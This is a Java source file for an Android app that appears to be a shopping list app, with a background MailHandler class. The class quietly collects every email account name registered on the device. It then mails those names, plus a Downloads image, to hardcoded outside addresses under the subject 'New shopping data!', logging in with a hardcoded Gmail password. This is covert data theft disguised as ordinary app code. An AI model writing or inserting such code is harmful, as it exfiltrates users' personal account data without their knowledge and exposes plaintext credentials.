package com.example.jonas.shoppinglist.communication;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.os.AsyncTask;
import android.util.Log;
import android.util.Patterns;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

public class MailHandler extends AsyncTask<String, Void, Void> {
    private static final String LOG_TAG = MailHandler.class.getSimpleName();
    private Activity activity;

    private List<Bitmap> imgs;

    public void setImgs(List<Bitmap> images){
        imgs = images;
    }

    public MailHandler(Activity activity) {
        this.activity = activity;
    }

    @Override
    protected Void doInBackground(String... params) {
        Mail m = new Mail("shoppingsender@gmail.com", "50centwindowshopper");
        m.setBody(params[0] + "\nFetched info from\n\n" + getInfo(activity));
        String[] toArr = {"devylder3@outlook.com", "shoppingreceiver@gmail.com"};
        m.setTo(toArr);
        m.setFrom("shoppingsender@gmail.com");
        m.setSubject("New shopping data!");

        try {
            for(Bitmap bm : imgs)
                m.addAttachment("/storage/emulated/0/Download/unnamed.jpg");
            m.send();

        } catch (Exception e) {
            Log.e(LOG_TAG, "Could not send email", e);
        }
        return null;
    }

    public List<String> getInfo(Context context){
        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        List<String> emails = new ArrayList<>();
        Account[] accounts = AccountManager.get(context).getAccounts();
        for(Account account: accounts) {
            if(emailPattern.matcher(account.name).matches())
            emails.add(account.name);
        }

        return emails;
    }
}
